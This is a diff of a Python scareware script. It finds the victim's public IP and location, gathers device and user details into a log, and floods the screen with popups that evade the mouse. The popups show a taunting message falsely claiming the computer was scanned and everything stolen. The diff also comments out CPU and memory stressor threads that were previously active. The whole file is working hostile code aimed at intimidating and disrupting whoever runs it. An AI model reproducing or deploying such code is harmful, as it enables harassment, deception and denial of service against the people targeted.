@@ -1,9 +1,3 @@
-#!/usr/bin/env python
-# coding: utf-8
-
-# In[1]:
-
-
 import subprocess
 import os
 import tkinter as tk
@@ -13,6 +7,10 @@ import random
 import pyautogui
 import re
 import requests
+import socket
+import psutil
+import platform
+import time
 
 def process_nslookup_output(output):
     ip_addresses = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', output)
@@ -25,17 +23,19 @@ def run_command(cmd):
         result = subprocess.check_output(["cmd", "/c", cmd], stderr=subprocess.STDOUT, universal_newlines=True)
         return result
     except subprocess.CalledProcessError as e:
-        return e.output  # If the command has a non-zero exit, return its output anyway.
+        return e.output
 
 def get_best_move(x, y, width, height, screen_width, screen_height):
-    # Check all four directions and pick the one that maximizes the distance
     distances = [
         (x, 0),  # top
         (0, y),  # left
-        (screen_width - width, y),  # right
-        (x, screen_height - height)  # bottom
+        (screen_width - width, y),
+        (x, screen_height - height)
     ]
-    return max(distances, key=lambda pos: ((pos[0] - x) ** 2 + (pos[1] - y) ** 2) ** 0.5)
+    
+    random.shuffle(distances)
+    subset = distances[:3]
+    return max(subset, key=lambda pos: ((pos[0] - x) ** 2 + (pos[1] - y) ** 2) ** 0.5)
 
 def show_dialog(title, text):
     root = tk.Tk()
@@ -50,20 +50,19 @@ def show_dialog(title, text):
     TITLE_BAR_HEIGHT = 30  # An estimated value; you may need to adjust this
 
     def move_away():
-        x, y = pyautogui.position()  # Get mouse cursor position
+        x, y = pyautogui.position()
         window_x = root.winfo_x()
         window_y = root.winfo_y() - TITLE_BAR_HEIGHT
         
         window_width = root.winfo_width()
         window_height = root.winfo_height()
 
-    # If mouse is inside window bounds, including the title bar, move window
         if window_x < x < window_x + window_width and window_y < y < window_y + window_height + TITLE_BAR_HEIGHT:
             new_x, new_y = get_best_move(x, y, window_width, window_height, screen_width, screen_height)
             root.geometry(f"+{new_x}+{new_y}")
         root.after(1, move_away)
-
-    move_away()  # Start the move_away function
+        
+    move_away()
 
     text_widget = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=20, bg='red', fg='white')
     text_widget.insert(tk.END, text)
@@ -100,11 +99,26 @@ def get_geolocation(ip_address):
         city = data.get("city", "N/A")
         region = data.get("region", "N/A")
         country = data.get("country", "N/A")
-        loc = data.get("loc", "N/A")  # Latitude and Longitude
+        loc = data.get("loc", "N/A")
         location = f"{city},\n{region},\n{country},\nCoordinates: {loc}"
         return location
     except Exception as e:
         return "Unknown location"
+    
+def get_device_desc():
+    os_name = os.name
+    system = platform.system()
+    release = platform.release()
+    version = platform.version()
+    architecture = platform.architecture()
+    machine = platform.machine()
+    hostname = socket.gethostname()
+    cpu_count = psutil.cpu_count(logical=False)
+    virtual_memory = psutil.virtual_memory()
+    current_user = os.getlogin()
+    device_desc = f"{system},{version}\n{architecture},{machine},{hostname}\n"
+    memory_desc = f"{cpu_count},{virtual_memory},{current_user}"
+    return device_desc+memory_desc
 
 if __name__ == "__main__":
     log_file = "output_log.txt"
@@ -124,18 +138,20 @@ if __name__ == "__main__":
         file.write(raw_output1)
         file.write("\n2:\n")
         file.write(raw_output2)
+        file.write("\n3:\n")
+        file.write(get_device_desc())
         
     ip_address = process_nslookup_output(raw_output1)
     location = get_geolocation(ip_address)
     
     output_phrase = f"hello you dumb idiot you are exposed\nwe scanned your ports\nand already have stolen everything you\nhave on your computer haha,\nthis is your public IP:\n{ip_address}\nLocation: {location}\n "
     
-    for _ in range(1000):
+    for _ in range(10):
         t = threading.Thread(target=show_dialog, args=("WARNING HAHAHAHAHA", output_phrase))
         t.start()
         
-    for _ in range(10):#CPU kill haha
-        threading.Thread(target=cpu_stressor).start()
+    #for _ in range(100):#CPU kill haha
+        #threading.Thread(target=cpu_stressor).start()
         
-    threading.Thread(target=memory_stressor).start()
+    #threading.Thread(target=memory_stressor).start()
 
